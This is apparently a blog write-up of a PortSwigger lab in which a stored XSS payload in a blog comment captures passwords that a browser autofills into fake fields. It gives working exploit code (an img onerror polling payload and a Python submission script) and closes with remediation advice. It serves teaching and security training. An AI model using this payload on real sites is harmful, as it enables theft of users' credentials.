---
layout: post
title: "Exploiting XSS to Capture Passwords via Browser Autofill"
date: 2027-06-19 09:00:00 -0500
categories: [PortSwigger, XSS]
tags: [xss, stored-xss, credential-capture, autofill, same-origin, portswigger]
---

## Overview

PortSwigger lab: *Exploiting cross-site scripting to capture passwords.*

The blog comment field stores input verbatim and renders it unencoded. An admin bot periodically visits posts with saved credentials in its browser password manager. The attack plants fake `name=username` and `type=password` inputs — the browser autofills them, a polling loop captures the values, and a same-origin fetch exfiltrates them back as a comment.

**CWE-79** — Stored Cross-Site Scripting.

---

## Why this works

Browser password managers match on field `name` attributes, not on page origin or form structure. Any page that renders `<input name=username>` followed by `<input type=password>` is treated as a valid autofill target — including a blog post full of user comments.

The attack chain:

1. Inject an `<img onerror>` payload into a blog comment.
2. Admin bot views the post.
3. Browser autofills `administrator:PASSWORD` into the fake inputs.
4. `setInterval` (500 ms) detects non-empty values.
5. Grab the page's own CSRF token via `document.querySelector('[name=csrf]').value`.
6. POST the captured `user:pass` as another comment — same-origin, fully authorized.

No external server. No Burp Collaborator. The CSRF token makes the exfil request indistinguishable from a legitimate comment.

---

## The payload

```html
<img src=x onerror="var sent=false;setInterval(function(){
  if(sent)return;
  var ps=document.querySelectorAll('[type=password]');
  var us=document.querySelectorAll('[name=username]');
  for(var i=0;i<ps.length;i++){
    if(ps[i].value){
      sent=true;
      var c=document.querySelector('[name=csrf]').value;
      fetch('/post/comment',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:new URLSearchParams({
          csrf:c, postId:10,
          comment:(us[i]?us[i].value:'?')+':'+ps[i].value,
          name:'x', email:'x@x.com'
        })
      });
      break;
    }
  }
},500)">
```

(Line-wrapped for readability — must be one line when posting.)

---

## Pitfalls

### Shell quoting destroys single quotes

`curl --data-urlencode 'comment=...'` — if the comment contains single quotes (for JS string literals), bash strips them. Use Python `requests` instead:

```python
import requests, re
s = requests.Session()
r = s.get('https://TARGET/post?postId=1', verify=False)
csrf = re.search('name="csrf" value="([^"]+)"', r.text).group(1)
s.post('https://TARGET/post/comment',
       data={'csrf': csrf, 'postId': '1', 'comment': PAYLOAD,
             'name': 'x', 'email': 'x@x.com'},
       verify=False, allow_redirects=False)
```

### Duplicate `id` → HTMLCollection

If the same XSS comment is submitted twice, both render on the page. Both have `id=username`. Browsers return an `HTMLCollection` for duplicate IDs — `window.username.value` is `undefined`. Use `querySelectorAll('[name=username]')[i]` with explicit index, never `getElementById` or the `window[id]` shorthand.

### `onchange` never fires for autofill

Browser autofill sets field values programmatically without dispatching change/input events. An `onchange` handler sees nothing. `setInterval` polling reads `.value` directly on every tick and catches autofilled values regardless.

### External webhooks are blocked

The official solution assumes Burp Collaborator (Burp Pro feature). Webhook.site and other external listeners receive zero requests from the lab victim network. Same-origin exfil (POST back to `/post/comment`) avoids this entirely.

---

## Remediation

HTML-encode all user-generated content before rendering:

```javascript
const esc = s => s
  .replace(/&/g, '&amp;').replace(/</g, '&lt;')
  .replace(/>/g, '&gt;').replace(/"/g, '&quot;')
  .replace(/'/g, '&#x27;');
```

If `<` becomes `&lt;`, no tag can be injected, and the password manager has nothing to autofill into.

Defence-in-depth: `Content-Security-Policy: script-src 'self'` blocks inline `onerror` handlers. `SameSite=Strict` cookies limit the blast radius of any remaining XSS. Serving user-generated content from a separate subdomain (e.g. `ugc.example.com`) means the password manager never associates stored credentials with attacker-controlled pages.
